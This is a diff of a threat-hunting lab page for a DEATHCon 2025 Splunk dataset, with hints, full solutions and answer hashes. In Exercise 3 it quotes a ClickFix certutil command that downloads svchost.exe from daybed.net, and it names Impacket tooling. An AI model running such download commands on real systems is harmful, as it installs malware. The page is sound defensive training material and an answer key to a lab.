@@ -179,6 +179,72 @@
             line-height: 1.6;
         }
 
+        /* Hints Section */
+        .hints-section {
+            margin-top: 1.5rem;
+        }
+
+        .hint-item {
+            margin-bottom: 1rem;
+        }
+
+        .hint-button {
+            background: #7d9eb5;
+            color: #000000;
+            border: 2px solid #7d9eb5;
+            padding: 0.6rem 1.2rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.85rem;
+            font-family: 'Inter', sans-serif;
+            margin-right: 0.5rem;
+        }
+
+        .hint-button:hover {
+            background: #a0c5de;
+            border-color: #a0c5de;
+            box-shadow: 0 0 15px rgba(125, 158, 181, 0.5);
+        }
+
+        .hint-button::after {
+            content: " ▼";
+        }
+
+        .hint-button.active::after {
+            content: " ▲";
+        }
+
+        .hint-content {
+            display: none;
+            background: rgba(125, 158, 181, 0.15);
+            border: 2px solid #7d9eb5;
+            border-left: 4px solid #7d9eb5;
+            padding: 1.5rem;
+            margin-top: 0.75rem;
+            animation: slideDown 0.3s ease;
+        }
+
+        .hint-content.show {
+            display: block;
+        }
+
+        .hint-label {
+            color: #7d9eb5;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.75rem;
+            font-size: 0.85rem;
+        }
+
+        .hint-text {
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
         /* Answer Section */
         .answer-section {
             margin-top: 1.5rem;
@@ -250,12 +316,33 @@
             line-height: 1.8;
         }
 
+        .answer-text p {
+            margin-bottom: 1rem;
+        }
+
         .answer-text code {
             background: rgba(125, 158, 181, 0.2);
             color: #7d9eb5;
             padding: 0.2rem 0.5rem;
             font-family: 'Courier New', monospace;
             font-size: 0.95rem;
+        }
+
+        .answer-text pre {
+            background: #0a0a0a;
+            border: 1px solid #7d9eb5;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+
+        .answer-text pre code {
+            background: none;
+            color: #a0c5de;
+            padding: 0;
+            font-size: 0.9rem;
+            line-height: 1.5;
         }
 
         .answer-text ol, .answer-text ul {
@@ -266,6 +353,120 @@
         .answer-text li {
             margin: 0.5rem 0;
             color: #cccccc;
+        }
+
+        /* Hash Spoiler */
+        .hash-spoiler {
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 2px solid rgba(220, 20, 60, 0.3);
+        }
+
+        .hash-reveal-button {
+            background: rgba(220, 20, 60, 0.2);
+            color: #DC143C;
+            border: 2px solid #DC143C;
+            padding: 0.6rem 1.2rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.85rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .hash-reveal-button:hover {
+            background: rgba(220, 20, 60, 0.3);
+            box-shadow: 0 0 10px rgba(220, 20, 60, 0.3);
+        }
+
+        .hash-reveal-button::after {
+            content: " 🔒";
+        }
+
+        .hash-reveal-button.active::after {
+            content: " 🔓";
+        }
+
+        .hash-content {
+            display: none;
+            background: rgba(220, 20, 60, 0.1);
+            border: 2px solid #DC143C;
+            padding: 1rem;
+            margin-top: 0.75rem;
+            font-family: 'Courier New', monospace;
+            animation: slideDown 0.3s ease;
+        }
+
+        .hash-content.show {
+            display: block;
+        }
+
+        .hash-content code {
+            color: #DC143C;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        /* Challenge Box */
+        .challenge-section {
+            margin-top: 1rem;
+        }
+
+        .challenge-reveal-button {
+            background: rgba(125, 158, 181, 0.2);
+            color: #7d9eb5;
+            border: 2px solid #7d9eb5;
+            padding: 0.6rem 1.2rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.85rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .challenge-reveal-button:hover {
+            background: rgba(125, 158, 181, 0.3);
+            box-shadow: 0 0 10px rgba(125, 158, 181, 0.3);
+        }
+
+        .challenge-reveal-button::before {
+            content: "⚡ ";
+        }
+
+        .challenge-reveal-button::after {
+            content: " ▼";
+        }
+
+        .challenge-reveal-button.active::after {
+            content: " ▲";
+        }
+
+        .challenge-content {
+            display: none;
+            background: rgba(125, 158, 181, 0.1);
+            border: 2px solid #7d9eb5;
+            border-left: 6px solid #7d9eb5;
+            padding: 1.5rem;
+            margin-top: 0.75rem;
+            font-family: 'Inter', sans-serif;
+            animation: slideDown 0.3s ease;
+        }
+
+        .challenge-content.show {
+            display: block;
+        }
+
+        .challenge-text {
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
+        .challenge-text li {
+            margin: 0.5rem 0;
         }
 
         /* Info Box */
@@ -281,11 +482,35 @@
             font-weight: 900;
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-bottom: 0.75rem;
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
         }
 
         .info-box-title::before {
             content: "ℹ️ ";
+        }
+
+        .info-box p {
+            color: #cccccc;
+            line-height: 1.6;
+            margin-bottom: 0.75rem;
+        }
+
+        .info-box p:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-box code {
+            background: rgba(125, 158, 181, 0.2);
+            color: #7d9eb5;
+            padding: 0.2rem 0.5rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .info-box strong {
+            color: #ffffff;
+            font-weight: 700;
         }
 
         @media (max-width: 768px) {
@@ -316,7 +541,19 @@
 
         <div class="info-box">
             <div class="info-box-title">Before You Begin</div>
-            <p>These exercises are designed to be completed in order. Each builds on concepts from the previous exercise. Try to solve each question on your own before revealing the answer!</p>
+            <p><strong>Dataset Location:</strong> This dataset can be found within the DEATHCon 2025 Splunk instance. Please log in and set your initial search time frame from <strong>October 15th - October 20th</strong>.</p>
+            
+            <p><strong>Difficulty Level:</strong> This dataset is intentionally more challenging than what was demonstrated in the video. If you get stuck, use the progressive hints to guide you through each question.</p>
+            
+            <p><strong>Answer Verification:</strong> To avoid spoilers, all answers are provided in SHA256 hash format. To check if your answer is correct, use the following Splunk query:</p>
+            
+            <p><code>| makeresults | eval hash=sha256("CHANGEME")</code></p>
+            
+            <p>Replace <code>CHANGEME</code> with your answer, then compare the resulting hash with the provided answer hash. For example, if the question was "What is the IP address for Google's DNS?" you would run:</p>
+            
+            <p><code>| makeresults | eval hash=sha256("8.8.8.8")</code></p>
+            
+            <p><strong>Important:</strong> The answer will ALWAYS be in the exact format as it appears in the raw log data & the plaintext answer can be found at the the bottom of the the "Show Full Solution" section.</p>
         </div>
 
         <!-- Exercise 1 -->
@@ -326,29 +563,87 @@
             <div class="instruction-section">
                 <div class="instruction-label">📋 Instructions</div>
                 <div class="instruction-text">
-                    [Context/setup for the exercise - explain the scenario, dataset, or what they should be looking for. This section is optional and can be removed if not needed.]
+                    Create a baseline of normal activity from October 15th through October 20th and develop a hypothesis for identifying suspicious binary activity. Consider how you might detect binaries being written to disk, executed, or spawning other processes. Look for patterns that deviate from the baseline.
                 </div>
             </div>
 
             <div class="question-section">
                 <div class="question-label">❓ Question</div>
                 <div class="question-text">
-                    [Your question here - what should the student find or determine?]
+                    What is the full file path of the malicious binary that was downloaded?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Focus your search on Windows event logs. If you're searching through proxy logs, you're looking in the wrong place. The key indicators you need are in the Windows Sysmon logs.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            Look for files being written to or executed from the system. Create a baseline of normal process execution and systematically exclude items that are clearly legitimate (like Windows system processes). Focus on identifying anomalous processes that stand out from your baseline.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            Pay special attention to files located in user <code>Downloads</code> folders. Once you identify a suspicious file in a Downloads directory, examine the process activity that occurs immediately after its execution. What child processes does it spawn?
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="answer-section">
-                <button class="reveal-button" onclick="toggleAnswer(this)">Show Answer</button>
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
                 <div class="answer-content">
-                    <div class="answer-label">✅ Solution</div>
+                    <div class="answer-label">✅ Full Solution</div>
                     <div class="answer-text">
-                        [Step-by-step instructions on how to find the answer. Can include:]
-                        <ol>
-                            <li>Step one description</li>
-                            <li>Step two with example: <code>index=main sourcetype=WinEventLog</code></li>
-                            <li>Step three explanation</li>
-                        </ol>
+                        <p><strong>Step 1: Identify Available Log Sources</strong></p>
+                        <p>First, determine what data is available in your Splunk environment:</p>
+                        <pre><code>| tstats count where index=* by index, source</code></pre>
+                        <p>You should see that the relevant data is in the <code>windows</code> index with source <code>WinEventLog:Microsoft-Windows-Sysmon/Operational</code>.</p>
+
+                        <p><strong>Step 2: Search for Anomalous Process Execution</strong></p>
+                        <p>Use Sysmon Event Code 1 (Process Creation) to identify suspicious processes. This query creates a baseline and highlights outliers:</p>
+                        <pre><code>index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
+| search NOT ComputerName=site-*
+| search NOT ("C:\\Users\\*\\selenium-manager.exe" OR "C:\\Windows\\Installer\\MSI*.tmp" OR "C:\\Users\\*\\DismHost.exe")
+| stats values(ParentImage) as ParentImages, values(ComputerName) as Computers, values(User) as Users dc(ComputerName) as HostCount, by Image
+| eventstats max(HostCount) as MaxHostCount
+| eval OutlierScore = round(100 * (HostCount / MaxHostCount), 2)
+| where OutlierScore < 15
+| sort OutlierScore</code></pre>
+
+                        <p><strong>Step 3: Analyze the Results</strong></p>
+                        <p>In the results, you should notice a suspicious file: <code>svchost.exe</code> located at <code>C:\Users\carla.rush\Downloads\svchost.exe</code>. This is highly anomalous because:</p>
+                        <ul>
+                            <li>The legitimate <code>svchost.exe</code> is a Windows system file that should only exist in <code>C:\Windows\System32\</code></li>
+                            <li>This binary is located in a user's Downloads folder</li>
+                            <li>It's spawning suspicious child processes like <code>net.exe</code> and <code>powershell.exe</code></li>
+                        </ul>
+
+                        <p><strong>Answer:</strong> <code>C:\Users\carla.rush\Downloads\svchost.exe</code></p>
                     </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <code>6b620a733e4892603d3c882bffbc181e68f336a4e1534d59ae76ff1f55f91534</code>
                 </div>
             </div>
         </div>
@@ -357,22 +652,88 @@
         <div class="exercise">
             <div class="exercise-number">Exercise 2</div>
 
-            <!-- No instruction section needed for this one -->
+            <div class="instruction-section">
+                <div class="instruction-label">📋 Instructions</div>
+                <div class="instruction-text">
+                    This is a tricky question that requires careful analysis of the attack timeline. Note that this download does <strong>not</strong> appear in the proxy logs, so focus your investigation on Windows event logs. You may need to look beyond the obvious places to find your answer. Think about how files are downloaded and what artifacts are left behind.
+                </div>
+            </div>
 
             <div class="question-section">
                 <div class="question-label">❓ Question</div>
                 <div class="question-text">
-                    [Another question here]
+                    The binary was downloaded from what domain?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Build a timeline of activity surrounding the malicious binary you discovered. What was the initial access vector? How did this file first appear on the system?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            What is the very first event you see that references this binary? Examine that event closely, along with the events immediately before and after it. Don't just look at process execution - consider file creation events as well.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            Look carefully at the <code>ParentCommandLine</code> field in the process execution events. The parent process that created or executed this file may contain valuable information about where it came from.
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="answer-section">
-                <button class="reveal-button" onclick="toggleAnswer(this)">Show Answer</button>
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
                 <div class="answer-content">
-                    <div class="answer-label">✅ Solution</div>
+                    <div class="answer-label">✅ Full Solution</div>
                     <div class="answer-text">
-                        [Answer instructions here]
+                        <p><strong>Step 1: Create a Targeted Search</strong></p>
+                        <p>Since searching for "svchost.exe" alone returns too many results (due to the legitimate Windows binary), we need to target the specific malicious binary we discovered:</p>
+                        <pre><code>index=windows "C:\\Users\\carla.rush\\Downloads\\svchost.exe"</code></pre>
+
+                        <p><strong>Step 2: Analyze the Timeline</strong></p>
+                        <p>Examine the events chronologically. The first event you'll see is a registry modification for the Compatibility Assistant. This is simply Windows checking whether the binary is compatible to run on the host - not the download itself.</p>
+
+                        <p><strong>Step 3: Identify File Creation Events</strong></p>
+                        <p>Look for Sysmon Event Code 11 (File Creation). You should see that this file was written to disk by <code>msedge.exe</code> (Microsoft Edge browser). Additionally, Event Code 15 shows a Zone.Identifier alternate data stream was created, which is typical for files downloaded from the internet.</p>
+
+                        <p><strong>Step 4: Find the Download Source</strong></p>
+                        <p>Unfortunately, Sysmon Event Code 15 doesn't record the exact domain in this case. However, if you continue down the timeline and examine the process execution events, look at the <code>ParentCommandLine</code> field. You'll find:</p>
+                        <pre><code>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument https://daybed.net/</code></pre>
+
+                        <p>This reveals that the binary was downloaded from <code>daybed.net</code>.</p>
+
+                        <p><strong>Key Takeaway:</strong> Sometimes the information you need isn't in the most obvious place. When direct artifact analysis doesn't reveal the full picture, examining parent processes and command-line arguments can provide crucial context.</p>
+
+                        <p><em>But this raises another question: Why did the user download this file from daybed.net? We'll need to investigate further...</em></p>
                     </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <p style="color: #DC143C; margin-bottom: 0.5rem; font-weight: 700;">Multiple valid formats accepted:</p>
+                    <code>1c51bee38ce1e9ab89a513c68a81b939e42fcd65c8837e3ac174fcb1ecbc6c01</code><br>
+                    <code>a62714dc4cfb3f25066eb0e62745b0ec1b42b808637bf4f4cc92e37518733bb2</code><br>
+                    <code>eebbdb2460f3ad7119a5cba7c6f4bccca3bc275002cbe91b3d4f69fcb322c11e</code><br>
+                    <code>4e8495218a9f52404995198312608b621900d1fc8413418f711b0b14af61260e</code>
                 </div>
             </div>
         </div>
@@ -384,27 +745,541 @@
             <div class="instruction-section">
                 <div class="instruction-label">📋 Instructions</div>
                 <div class="instruction-text">
-                    [Another scenario setup]
+                    Now that you know where the binary was downloaded from, it's time to understand <em>how</em> the user was tricked into downloading it. Social engineering attacks often leave specific artifacts and identifiers in the logs that can help us understand the attack chain.
                 </div>
             </div>
 
             <div class="question-section">
                 <div class="question-label">❓ Question</div>
                 <div class="question-text">
-                    [Question text]
+                    The user was tricked into downloading this binary through a social engineering attack. What was the ID associated with this attack attempt?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Build a complete timeline of all activity leading up to the malicious binary's execution. Look at what happened in the minutes before the file appeared on the system. What other suspicious activity do you see?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            Have you searched for all your known artifacts? Remember to pivot on similar indicators - if you found a domain, search for that domain. If you found an IP address, search for that IP. Each artifact can reveal new pieces of the puzzle.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            Follow the user's activity approximately 30-35 minutes before the binary execution. Pay close attention to the <code>Image</code> and <code>CommandLine</code> fields. What commands were executed around that time?
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="answer-section">
-                <button class="reveal-button" onclick="toggleAnswer(this)">Show Answer</button>
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
                 <div class="answer-content">
-                    <div class="answer-label">✅ Solution</div>
+                    <div class="answer-label">✅ Full Solution</div>
                     <div class="answer-text">
-                        [Solution steps]
+                        <p><strong>Step 1: Search for the Domain Artifact</strong></p>
+                        <p>You previously discovered that the binary was downloaded from <code>daybed.net</code>. Let's search for all Windows events containing this domain:</p>
+                        <pre><code>index=windows daybed.net</code></pre>
+                        <p>This returns dozens of events. Sort them chronologically to build a timeline.</p>
+
+                        <p><strong>Step 2: Analyze Early Timeline Events</strong></p>
+                        <p>Starting from the first event, you should observe a DNS request to <code>daybed.net</code>, followed immediately by a suspicious process execution of <code>certutil.exe</code>.</p>
+
+                        <p><strong>Step 3: Examine the Certutil Command</strong></p>
+                        <p>Certutil is a legitimate Windows utility that's frequently abused by attackers to download malicious files (it's a "Living Off the Land" binary). Review the full command line:</p>
+                        <pre><code>"C:\Windows\system32\certutil.exe" -urlcache -f http://daybed.net/svchost.exe svchost.exe# I am not a robot reCAPTCHA Verification ID:1337</code></pre>
+
+                        <p><strong>The Answer:</strong> The ID associated with this social engineering attempt is <code>1337</code>.</p>
+
+                        <p>Notice the suspicious text in the command: "I am not a robot reCAPTCHA Verification". This suggests the user was tricked through some kind of social engineering technique, but what exactly was this attack method?</p>
+
+                        <p><strong>Additional Resources:</strong></p>
+                        <p>Learn more about certutil abuse on the LOLBAS project: <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" target="_blank" style="color: #7d9eb5;">https://lolbas-project.github.io/lolbas/Binaries/Certutil/</a></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <p style="color: #DC143C; margin-bottom: 0.5rem; font-weight: 700;">Multiple valid formats accepted:</p>
+                    <code>5db1fee4b5703808c48078a76768b155b421b210c0761cd6a5d223f4d99f1eaa</code><br>
+                    <code>4e7d48738279e37b9fb6a1993246585ec6cd7d9dc58f682e373c7dce65d9d8e1</code><br>
+                    <code>211b2eac8272ebe728fe5950c61d0bc8e17a3aafd2cc5fef1d6343b1e3b2f7fa</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Exercise 4 -->
+        <div class="exercise">
+            <div class="exercise-number">Exercise 4</div>
+
+            <div class="instruction-section">
+                <div class="instruction-label">📋 Instructions</div>
+                <div class="instruction-text">
+                    You've identified the artifacts and command execution from the previous exercises. Now it's time to understand what type of attack was used. <strong>Note:</strong> You will not find the direct answer to this question in the SIEM. You'll need to conduct external research based on the evidence you've collected.
+                </div>
+            </div>
+
+            <div class="question-section">
+                <div class="question-label">❓ Question</div>
+                <div class="question-text">
+                    What is the name of the social engineering attack technique that was modeled in this scenario?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Review the certutil command you found in Exercise 3. What were the key characteristics of this attack? The user was prompted with a fake verification screen and tricked into running a command. What elements stood out in that command line?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            Search for social engineering attacks that involve fake CAPTCHA or verification prompts. Look for techniques where attackers trick users into opening the Run dialog (Win+R) and pasting malicious commands. What are these types of attacks commonly called?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            Try searching for terms like: "fake CAPTCHA malware attack", "social engineering Win+R paste command", or "reCAPTCHA verification phishing". Recent security advisories and threat intelligence reports have documented this emerging attack technique.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="answer-section">
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
+                <div class="answer-content">
+                    <div class="answer-label">✅ Full Solution</div>
+                    <div class="answer-text">
+                        <p><strong>Research Methodology</strong></p>
+                        <p>Based on the evidence gathered in previous exercises, we know:</p>
+                        <ul>
+                            <li>The user executed a certutil command containing "I am not a robot reCAPTCHA Verification"</li>
+                            <li>The command was likely entered via Win+R (Windows Run dialog)</li>
+                            <li>This resulted in downloading and executing a malicious binary</li>
+                            <li>The attack used social engineering to trick the user</li>
+                        </ul>
+
+                        <p><strong>External Research</strong></p>
+                        <p>Searching for combinations of these indicators leads to a specific attack technique that has been documented by security researchers and threat intelligence teams. Key search terms that yield results:</p>
+                        <ul>
+                            <li>"fake CAPTCHA malware" or "fake reCAPTCHA attack"</li>
+                            <li>"Win+R paste command social engineering"</li>
+                            <li>"CAPTCHA verification phishing technique"</li>
+                        </ul>
+
+                        <p><strong>The Answer: ClickFix</strong></p>
+                        <p>This is a <strong>ClickFix</strong> attack (also sometimes called a "fake CAPTCHA" or "CAPTCHA bypass" attack). In this technique:</p>
+                        <ul>
+                            <li>Victims are directed to a malicious or compromised website (often via phishing)</li>
+                            <li>They're presented with a fake CAPTCHA or verification prompt</li>
+                            <li>The page instructs them to "verify you're human" by pressing Win+R and pasting a command</li>
+                            <li>The command (often using certutil, PowerShell, or other LOLBAS techniques) downloads and executes malware</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <p style="color: #DC143C; margin-bottom: 0.5rem; font-weight: 700;">Multiple valid formats accepted:</p>
+                    <code>58acd85a463ceb10587b53418607644a50e8c11c0cf1a29e796a5bb8387fe18f</code><br>
+                    <code>a9f480c063d2f9f314d60dd632f29085dd2e24f66834319e009113b3264d8eba</code><br>
+                    <code>a71e456a04013374f1773152e1194936b72a36bd8f83b74e0e31de277ee11233</code><br>
+                    <code>04ca47ae2d8d1b7aeab8598338e5dca41220f8c1cc2d4cdfef73dcbb7ac208a2</code><br>
+                    <code>308df6838dbca485581c1946e2dc4eb525ee5f3892a74c1009e2306bca2b7ad5</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Exercise 5 -->
+        <div class="exercise">
+            <div class="exercise-number">Exercise 5</div>
+
+            <div class="instruction-section">
+                <div class="instruction-label">📋 Instructions</div>
+                <div class="instruction-text">
+                    Now that you've identified the initial compromise, it's time to understand what the threat actor did next. They leveraged a popular post-exploitation toolkit to identify a common Active Directory misconfiguration. Your job is to correlate this activity within the logs and determine the scope of their enumeration.
+                </div>
+            </div>
+
+            <div class="question-section">
+                <div class="question-label">❓ Question</div>
+                <div class="question-text">
+                    The threat actor used Impacket to identify an Active Directory misconfiguration called AS-REPRoasting. How many accounts were targeted?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Research Impacket and identify what tools or scripts can be used to conduct an AS-REPRoasting attack. What does the tool do, and how does it communicate with Active Directory to enumerate vulnerable accounts?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            What server does the infected host need to connect to in order for this enumeration to be successful? Think about what infrastructure component manages authentication in an Active Directory environment.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            What port would this Kerberos authentication request be made over? Once you know the port, search for network connections from the malicious binary to that specific port. Count the number of connection events.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="answer-section">
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
+                <div class="answer-content">
+                    <div class="answer-label">✅ Full Solution</div>
+                    <div class="answer-text">
+                        <p><strong>Step 1: Understanding AS-REPRoasting with Impacket</strong></p>
+                        <p>Research into Impacket reveals that <code>GetNPUsers.py</code> is the tool used for AS-REPRoasting attacks. This script:</p>
+                        <ul>
+                            <li>Sends unauthenticated Kerberos AS-REQ (Authentication Service Request) messages</li>
+                            <li>Targets the Domain Controller</li>
+                            <li>Operates over port 88 (Kerberos)</li>
+                            <li>Identifies accounts that don't require Kerberos pre-authentication</li>
+                        </ul>
+
+                        <p><strong>Step 2: Identifying the Communication Pattern</strong></p>
+                        <p>To successfully enumerate vulnerable accounts, the malicious binary needs to:</p>
+                        <ul>
+                            <li>Connect to the Domain Controller</li>
+                            <li>Use port 88 (the Kerberos authentication port)</li>
+                            <li>Send multiple requests to test different accounts</li>
+                        </ul>
+
+                        <p><strong>Step 3: Correlating in the Logs</strong></p>
+                        <p>Use Sysmon Event Code 3 (Network Connection) to identify outbound connections from the malicious binary to port 88:</p>
+                        <pre><code>index=windows ComputerName="br-win10-10.site.lan" Image="C:\\Users\\carla.rush\\Downloads\\svchost.exe" EventCode=3 DestinationPort=88</code></pre>
+
+                        <p><strong>Step 4: Analyzing the Results</strong></p>
+                        <p>The search reveals <strong>10 total events</strong> occurring over approximately 2 seconds. Each network connection event represents an AS-REQ request for a different account. This rapid succession of connections to port 88 is characteristic of automated enumeration.</p>
+
+                        <p><strong>The Answer:</strong> <code>10</code> accounts were targeted in the AS-REPRoasting scan.</p>
+
+                        <p><strong>Detection Insight:</strong></p>
+                        <p>Multiple rapid connections to port 88 from a non-standard process (especially one originating from a user's Downloads folder) is a strong indicator of Kerberos-based attacks like AS-REPRoasting or Kerberoasting.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <p style="color: #DC143C; margin-bottom: 0.5rem; font-weight: 700;">Multiple valid formats accepted:</p>
+                    <code>4a44dc15364204a80fe80e9039455cc1608281820fe2b24f1e5233ade6af1dd5</code><br>
+                    <code>e4432baa90819aaef51d2a7f8e148bf7e679610f3173752fabb4dcb2d0f418d3</code><br>
+                    <code>91617f4849abe274fbd0c4f4c3b3b6e68a99e40e077f2c51aa9428689926a058</code>
+                </div>
+            </div>
+
+            <div class="challenge-section">
+                <button class="challenge-reveal-button" onclick="toggleChallenge(this)">Challenge: Build a Detection</button>
+                <div class="challenge-content">
+                    <div class="challenge-text">
+                        Want to test your Splunk skills? See if you can build a detection rule for AS-REPRoasting enumeration! Consider:
+                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                            <li>What Event Codes are relevant?</li>
+                            <li>What threshold of connections to port 88 would be suspicious?</li>
+                            <li>How can you filter out legitimate Kerberos activity?</li>
+                            <li>What fields should you alert on?</li>
+                        </ul>
                     </div>
                 </div>
             </div>
         </div>
+
+        <!-- Exercise 6 -->
+        <div class="exercise">
+            <div class="exercise-number">Exercise 6</div>
+
+            <div class="instruction-section">
+                <div class="instruction-label">📋 Instructions</div>
+                <div class="instruction-text">
+                    The threat actor has escalated their attack and is now targeting Active Directory credentials. This exercise requires you to correlate activity across multiple log sources and timeframes. Look for patterns that connect different types of malicious activity together.
+                </div>
+            </div>
+
+            <div class="question-section">
+                <div class="question-label">❓ Question</div>
+                <div class="question-text">
+                    A DCSync attack was conducted! What was the process that was used to conduct this action?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Research how to identify a DCSync attack. What specific logs and Event Codes are generated when someone replicates Active Directory data? What object types or GUIDs should you look for?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            Once you identify when the DCSync occurred, narrow your time frame to shortly before and after this event. Then pivot back to the infected host's logs. What suspicious activity do you see in the minutes leading up to the DCSync?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
